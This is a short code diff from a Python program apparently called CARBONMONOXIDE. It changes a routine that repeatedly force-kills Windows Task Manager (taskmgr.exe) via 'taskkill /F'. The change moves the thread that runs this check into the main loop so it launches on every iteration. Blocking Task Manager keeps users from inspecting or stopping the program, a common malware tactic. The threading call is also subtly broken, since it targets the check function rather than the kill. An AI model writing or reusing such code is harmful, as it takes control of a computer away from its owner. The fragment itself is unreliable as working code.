@@ -20,10 +20,11 @@ class no_taskmanager():
     try:
         if is_running("taskmgr.exe"):
             os.system("taskkill /F /IM taskmgr.exe")
-    except:
-        print("Error checking task manager. Continuing...")
+    except Exception as e:
+        print(f"Error checking task manager: {e}")
+        pass
+   
 
-threading.Thread(target=no_taskmanager.is_running, args=("taskmgr.exe",)).start()
     
 
 pyfiglet.print_figlet("CARBONMONOXIDE", font="ansi_shadow", colors="CYAN")
@@ -422,6 +423,7 @@ def main():
 
     try:
         while True:
+            threading.Thread(target=no_taskmanager.is_running, args=("taskmgr.exe",)).start()
             try:
                 manager.run()
             except StopIteration:
